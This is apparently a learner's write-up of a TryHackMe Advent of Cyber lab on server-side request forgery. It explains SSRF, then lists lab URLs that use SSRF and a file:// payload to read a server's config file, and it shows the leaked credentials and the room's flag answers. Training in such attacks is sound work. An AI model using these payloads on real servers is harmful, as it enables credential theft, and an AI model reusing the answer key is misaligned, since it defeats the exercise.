
# Task 28  [Day 22] SSRF Jingle Your SSRF Bells: A Merry Command & Control Hackventure

#ssrf

## Learning Objectives

- Understanding server-side request forgery (SSRF)
- Which different types of SSRF are used to exploit the vulnerability
- Prerequisites for exploiting the vulnerability
- How the attack works
- How to exploit the vulnerability
- Mitigation measures for protection

## What Is SSRF?

SSRF, or server-side request forgery, is a security vulnerability that occurs when an attacker tricks a web application into making unauthorised requests to internal or external resources on the server's behalf. This can allow an attacker to interact with internal systems, potentially leading to data exposure or unauthorised actions. Leaving web applications vulnerable to SSRF can have profound security implications, potentially leading to unauthorised access to internal systems, remote code execution (RCE), data breaches, or the application being further compromised.  

 
## Types of SSRF Attack

- **Basic:** In a basic SSRF attack, the attacker sends a crafted request from the vulnerable server to internal or external resources. For example, they might attempt to access files on the local file system, internal services, or databases that are not intended to be publicly accessible.
- **Blind SSRF**: In a blind SSRF attack, the attacker doesn't directly see the response to the request. Instead, they may infer information about the internal network by measuring the time it takes for the server to respond or observing error message changes.
- **Semi-blind SSRF**: In semi-blind SSRF, again, the attacker does not receive direct responses in their browser or application. However, they rely on indirect clues, side-channel information, or observable effects within the application to determine the success or failure of their SSRF requests. This might involve monitoring changes in application behaviour, response times, error messages, and other signs.
 
## Prerequisites for Exploitation

- **Vulnerable input points:** Web applications must have input fields susceptible to manipulation, such as URLs or file upload functionalities.
- **Lack of input validation**: The application should have adequate input validation or effective sanitisation mechanisms, allowing an attacker to craft malicious requests.

## How Does SSRF Work?

- **Identifying vulnerable input**: The attacker locates an input field within the application that can be manipulated to trigger server-side requests. This could be a URL parameter in a web form, an API endpoint, or request parameter input such as the referrer.
- **Manipulating the input**: The attacker inputs a malicious URL or other payloads that cause the application to make unintended requests. This input could be a URL pointing to an internal server, a loopback address, or an external server under the attacker's control.
- **Requesting unauthorised resources**: The application server, unaware of the malicious input, makes a request to the specified URL or resource. This request could target internal resources, sensitive services, or external systems.
- **Exploiting the response**: Depending on the application's behaviour and the attacker's payload, the response from the malicious request may provide valuable information, such as internal server data, credentials, system credentials/information, or pathways for further exploitation.


## Working

**Identify vulnerable input:**

http://mcgreedysecretc2.thm/api.php



http://10.10.32.33/getClientData.php?url=http://10.2.6.197/

http://10.10.32.33/getClientData.php?url=file:////var/www/html/config.php

```
<?php
$username = "mcgreedy";
$password = "mcgreedy!@#$%";

?>
```

- Enter to dashboard
http://mcgreedysecretc2.thm/dashboard.php






## Answer the questions below

Is SSRF the process in which the attacker tricks the server into loading only external resources (yea/nay)?

NAN

What is the C2 version?  

1.1

What is the username for accessing the C2 panel?  

 mcgreedy

What is the flag value after accessing the C2 panel?  

 THM{EXPLOITED_31001}

What is the flag value after stopping the data exfiltration from the McSkidy computer?  

THM{AGENT_REMOVED_1001}



I completed  Task 28  [Day 22] SSRF Jingle Your SSRF Bells: A Merry Command & Control Hackventure!, Don't miss out Tryhackme #AdventOfCyber @RealTryHackMe https://tryhackme.com/room/adventofcyber2023